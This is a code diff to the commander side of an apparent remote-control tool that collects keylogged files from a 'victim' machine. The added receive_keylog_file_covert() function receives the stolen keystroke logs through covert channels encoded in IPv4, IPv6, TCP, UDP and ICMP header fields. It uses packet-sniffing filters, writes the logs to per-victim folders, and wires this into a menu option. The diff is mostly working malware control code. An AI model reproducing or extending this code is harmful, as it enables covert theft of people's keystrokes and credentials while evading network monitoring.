@@ -2706,6 +2706,7 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
         print(constants.MENU_CLOSING_BANNER)
         return constants.FILE_DNE
 
+
 # ========================== EXTRACT COVERT DATA FUNCTIONS ==========================
 
 
@@ -2749,6 +2750,7 @@ def get_packet_count(client_socket: socket):
     count = int(client_socket.recv(1024).decode())
     print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
     return count
+
 
 # ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================
 
@@ -3832,6 +3834,162 @@ def receive_file_covert(client_socket: socket.socket,
         return None
 
 
+def receive_keylog_file_covert(client_socket: socket.socket,
+                               client_ip: str,
+                               client_port: int,
+                               source_ip: str,
+                               source_port: int,
+                               choices: tuple,
+                               save_file_path: str,
+                               file_name: str):
+    """
+    A different version from the regular receive_file_covert(),
+    but specifically deals with the receiving of saved keylogged
+    files from victim.
+
+    @param client_socket:
+        The target/victim socket
+
+    @param client_ip:
+        The target/victim's IP address
+
+    @param client_port:
+        The target/victim's port number
+
+    @param source_port:
+        The commander's port number
+
+    @param choices:
+        A tuple containing the covert channel configuration
+        (header/field)
+
+    @param save_file_path:
+        A string representing the file path of keylog .txt file in the current directory
+
+    @param file_name:
+        A string containing the file name
+
+    @return: None
+    """
+    # CHECK: If destination field choice, do nothing
+    if constants.DESTINATION_ADDRESS_FIELD in choices:
+        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+        return None
+
+    # Initialize Map and variables
+    received_packets = []
+    header_field_function_map = get_protocol_header_function_extract_map()
+
+    if choices in header_field_function_map:
+        selected_function = header_field_function_map.get(choices)
+
+    # A callback function for handling of received packets
+    def packet_callback(packet):
+        global filename
+        binary_data = selected_function(packet)
+        return binary_data
+
+    # DIFFERENT SNIFFS: For IPv4 Headers/Field
+    if constants.IPV4 in choices:
+        # Get total count of packets
+        count = get_packet_count(client_socket)
+
+        if constants.SOURCE_ADDRESS_FIELD in choices:
+            received_packets = sniff(filter="dst host {} and dst port {}"
+                                     .format(source_ip, source_port), count=count)
+        else:  # REGULAR IPv4 SNIFF
+            received_packets = sniff(filter="src host {}".format(client_ip), count=count)
+
+    # DIFFERENT SNIFFS: For IPv6 Headers/Field
+    if constants.IPV6 in choices:
+        # Get own IPv6 address and port
+        source_ipv6_ip, source_ipv6_port = determine_ipv6_address()
+
+        # Transfer ipv6_getter.py file to victim/target and get their IPv6 address
+        victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)
+
+        # Send own IPv6 address and port
+        client_socket.send((source_ipv6_ip + "/" + str(source_ipv6_port)).encode())
+
+        # Get total count of packets
+        count = get_packet_count(client_socket)
+
+        if constants.NEXT_HEADER in choices:
+            received_packets = sniff(filter="src host {} and dst host {}"
+                                     .format(victim_ipv6_addr, source_ipv6_ip),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="dst host {} and dst port {}"
+                                     .format(source_ipv6_ip, source_ipv6_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For TCP Headers/Field
+    if constants.TCP in choices:
+        count = get_packet_count(client_socket)
+
+        if constants.SOURCE_PORT_FIELD in choices:
+            received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
+                                            "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+        elif constants.DESTINATION_PORT_FIELD in choices:
+            received_packets = sniff(filter="tcp and dst host {} and src host {} and "
+                                            "(tcp[13] & 0x004 == 0)"
+                                     .format(source_ip, client_ip),
+                                     count=count)
+
+        elif constants.FLAG in choices:  # Capture all flags
+            received_packets = sniff(filter="tcp and dst host {} and dst port {}"
+                                     .format(source_ip, source_port),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="tcp and dst host {} and dst port {} "
+                                            "and tcp[13] & 0x004 == 0"
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For UDP Headers/Field
+    if constants.UDP in choices:
+        count = get_packet_count(client_socket)
+
+        if constants.DESTINATION_PORT_FIELD in choices:
+            received_packets = sniff(filter="udp and dst host {} and src host {}"
+                                     .format(source_ip, client_ip),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="udp and dst host {} and dst port {}"
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For ICMP Header/Fields
+    if constants.ICMP in choices:
+        count = get_packet_count(client_socket)
+
+        received_packets = sniff(filter="icmp and dst host {} and src host {}"
+                                 .format(source_ip, client_ip),
+                                 count=count)
+
+    # Extract Data
+    extracted_data = ''.join(packet_callback(packet)
+                             for packet in received_packets if packet_callback(packet))
+
+    # Write Data to File
+    covert_data_write_to_file(extracted_data, save_file_path)
+
+    # Send ACK to victim (if good)
+    if is_file_openable(save_file_path):
+        print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
+        client_socket.send(constants.VICTIM_ACK.encode())
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None
+    else:
+        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None
+
 # // ===================================== END OF COVERT CHANNEL FUNCTIONS ===================================== //
 
 
@@ -3878,7 +4036,9 @@ def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
         return False
 
 
-def receive_keylog_files(client_socket, number_of_files: int, sub_directory_path: str):
+def __receive_keylog_files(client_socket: socket.socket, dest_ip: str, dest_port: int,
+                           source_ip: str, source_port: int, choices: tuple,
+                           sub_directory_path: str, number_of_files: int):
     """
     Receives any recorded keylog .txt files from the client/victim
 
@@ -3895,28 +4055,19 @@ def receive_keylog_files(client_socket, number_of_files: int, sub_directory_path
     """
 
     for i in range(int(number_of_files)):
+        # Get file name
         file_name = client_socket.recv(constants.BYTE_LIMIT).decode()
         print(constants.RECEIVING_FILE_MSG.format(file_name))
 
+        # Send choice (header/field) for covert channel
+        client_socket.send((choices[0] + "/" + choices[1]).encode())
+
+        # Create a new file path under downloads/client_ip/____.txt
         file_path = os.path.join(sub_directory_path, file_name)
+        print(file_path)
 
-        with open(file_path, constants.WRITE_BINARY_MODE) as file:
-            while True:
-                data = client_socket.recv(constants.BYTE_LIMIT)
-                if not data:
-                    break
-                if data.endswith(constants.END_OF_FILE_SIGNAL):
-                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
-                    file.write(data)
-                    break
-                file.write(data)
-
-        # Send ACK to commander (if good)
-        if is_file_openable(file_path):
-            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-            client_socket.send(constants.VICTIM_ACK.encode())
-        else:
-            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        receive_keylog_file_covert(client_socket, dest_ip, dest_port, source_ip,
+                                   source_port, choices, file_path, file_name)
 
 
 def find_specific_client_socket(client_dict: dict,
@@ -3950,84 +4101,7 @@ def find_specific_client_socket(client_dict: dict,
         return None, None, None, None, None
 
 
-def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
-                                source_port: int, choices: tuple):
-    # Initialize map
-    header_field_function_map = __get_protocol_header_transfer_function_map()
-
-    # Get User Input for File + Check if Exists
-    file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))
-
-    # Check if the file exists
-    if os.path.exists(file_path):
-        print(constants.TRANSFER_FILE_FOUND_MSG.format(file_path))
-        print(constants.TRANSFER_FILE_INIT_MSG.format(file_path))
-
-        # Parse File Name
-        parsed_file_path = file_path.split("/")
-        file_name = parsed_file_path[-1]
-
-        # Send file name and choices
-        sock.send((file_name + "/" + choices[0] + "/" + choices[1]).encode())
-
-        # Find the choice(header/field) in map, get and call the mapped function
-        if choices in header_field_function_map:
-            selected_function = header_field_function_map.get(choices)
-
-            # DIFFERENT HANDLERS: IPv4
-            if constants.IPV4 in choices:
-                if constants.SOURCE_ADDRESS_FIELD in choices:
-                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
-
-                elif selected_function is not None and callable(selected_function):
-                    selected_function(sock, dest_ip, file_path)
-
-            # DIFFERENT HANDLERS: IPv6
-            elif constants.IPV6 in choices:
-                if constants.DESTINATION_ADDRESS_FIELD in choices:
-                    __transfer_file_dst_addr_error_handler(choices[1], choices[0])
-                    return None
-
-                # Get victim IPv6 address and port
-                dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
-                selected_function(sock, dest_ip, dest_port, file_path)
-
-            # DIFFERENT HANDLERS: TCP or UDP
-            elif constants.TCP in choices or constants.UDP in choices:
-                selected_function(sock, dest_ip, dest_port, source_port, file_path)
-
-            # DIFFERENT HANDLERS: ICMP
-            elif constants.ICMP in choices:
-                selected_function(sock, dest_ip, file_path)
-
-            else:
-                print(constants.CALL_MAP_FUNCTION_ERROR)
-                return None
-        else:
-            print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
-            return None
-
-        # Get an ACK from the victim for success
-        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
-
-        if transfer_result == constants.VICTIM_ACK:
-            print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
-                                                            dest_ip,
-                                                            dest_port))
-            print(constants.RETURN_MAIN_MENU_MSG)
-            print(constants.MENU_CLOSING_BANNER)
-        else:
-            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
-            print(constants.RETURN_MAIN_MENU_MSG)
-            print(constants.MENU_CLOSING_BANNER)
-    else:
-        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
-        print(constants.RETURN_MAIN_MENU_MSG)
-        print(constants.MENU_CLOSING_BANNER)
-        return constants.FILE_DNE
-
-
-def perform_menu_item_3(client_dict: dict, source_port: int):
+def perform_menu_item_3(client_dict: dict):
     # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
         print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)
@@ -4284,7 +4358,7 @@ def __make_main_and_sub_directories(client_ip: str):
     return sub_directory_path
 
 
-def perform_menu_item_4(client_dict: dict):
+def perform_menu_item_4(client_dict: dict, source_ip: str, source_port: int):
     # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
         print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
@@ -4303,7 +4377,8 @@ def perform_menu_item_4(client_dict: dict):
             print(constants.MENU_CLOSING_BANNER)
             return None
         else:
-            __perform_menu_item_4_helper(client_socket, client_ip, client_port)
+            choices = protocol_and_field_selector()
+            __perform_menu_item_4_helper(client_socket, client_ip, client_port, source_ip, source_port, choices)
 
     # CASE 3: Handle a specific client/victim (or if multiple clients)
     elif len(client_dict) != constants.ZERO:
@@ -4319,12 +4394,16 @@ def perform_menu_item_4(client_dict: dict):
                 print(constants.MENU_CLOSING_BANNER)
                 return None
             else:
-                __perform_menu_item_4_helper(target_socket, target_ip, target_port)
+                choices = protocol_and_field_selector()
+                __perform_menu_item_4_helper(target_socket, target_ip, target_port, source_ip, source_port, choices)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
 
 
-def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, client_port: int):
+def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str,
+                                 client_port: int, source_ip: str, source_port: int,
+                                 choices: tuple):
+
     # Send to victim a notification that it is wanting to receive keylog files
     print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
     client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())
@@ -4334,23 +4413,19 @@ def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, c
     response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
     response_status = response[0]
     response_msg = response[1]
+    number_of_files = response[2]
     print(constants.CLIENT_RESPONSE.format(response_msg))
 
     # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
     if response_status == constants.STATUS_TRUE:
         sub_directory_path = __make_main_and_sub_directories(client_ip)
 
-        # Send ACK response
-        client_socket.send("OK".encode())
-
-        # Get number of files from client/victim for iteration length
-        number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
-
         # Send ACK
         client_socket.send("OK".encode())
 
-        # ADD files from client to commander
-        receive_keylog_files(client_socket, int(number_of_files), sub_directory_path)
+        # GET files from target to commander
+        __receive_keylog_files(client_socket, client_ip, client_port, source_ip, source_port,
+                               choices, sub_directory_path, int(number_of_files))
 
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
